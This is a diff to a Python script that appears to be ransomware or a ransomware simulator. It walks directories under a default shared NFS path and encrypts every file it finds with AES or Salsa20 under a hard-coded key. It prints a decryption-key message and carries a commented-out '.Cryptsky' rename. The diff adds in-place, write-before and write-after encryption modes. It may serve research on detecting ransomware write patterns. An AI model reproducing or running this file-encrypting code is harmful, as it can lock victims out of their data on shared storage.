@@ -22,6 +22,7 @@ def get_parser():
                         action="store_true")
     parser.add_argument('-a', '--algo', help='Crypto Algo', default="AES")
     parser.add_argument('-m', '--mode', help='AES mode', default="CTR")
+    parser.add_argument('-w', '--write', help='Write method', default="O")
     parser.add_argument('-p', '--path', help='Add the path to encrypt/decrypt',
                         default='/mnt/nfs_shared')
     return parser
@@ -32,6 +33,7 @@ def main():
     decrypt = args['decrypt']
     algo = args['algo']
     user_mode = args['mode']
+    write_mode = args['write']
     try:
         mode = getattr(AES, f"MODE_{user_mode.upper()}")
     except AttributeError:
@@ -60,15 +62,12 @@ Your decryption key is: {HARDCODED_KEY}\
 
     if algo == 'AES':
         if mode in (AES.MODE_CBC, AES.MODE_CFB, AES.MODE_OFB):
-            print(AES.block_size)
             iv = 'initial_vectors!'.encode('utf-8')
             crypt = AES.new(key, mode, iv=iv)
         elif mode == AES.MODE_CTR:
             ctr = Counter.new(128)
-            print(ctr)
             crypt = AES.new(key, mode, counter=ctr)
         else:
-            print(AES.block_size)
             crypt = AES.new(key, mode)
     elif algo == 'Salsa20':
         nonce = 'nonce_b!'.encode("utf-8")
@@ -83,11 +82,22 @@ Your decryption key is: {HARDCODED_KEY}\
 
     for currentDir in startdirs:
         for f in discover.discoverFiles(currentDir):
-            print(f)
-            if decrypt:
-                modify.modify_file_inplace(f, crypt, encrypt=0)
-            else:
-                modify.modify_file_inplace(f, crypt, encrypt=1)
+            #print(f)
+            if write_mode == 'O':
+                if decrypt:
+                    modify.modify_file_inplace(f, crypt, encrypt=0)
+                else:
+                    modify.modify_file_inplace(f, crypt, encrypt=1)
+            elif write_mode == 'WB':
+                if decrypt:
+                    modify.modify_file_writebefore(f, crypt, encrypt=0)
+                else:
+                    modify.modify_file_writebefore(f, crypt, encrypt=1)
+            elif write_mode == 'WA':
+                if decrypt:
+                    modify.modify_file_writeafter(f, crypt, encrypt=0)
+                else:
+                    modify.modify_file_writeafter(f, crypt, encrypt=1)
             #os.rename(file, file+'.Cryptsky') # append filename to indicate crypted
 
     # This wipes the key out of memory
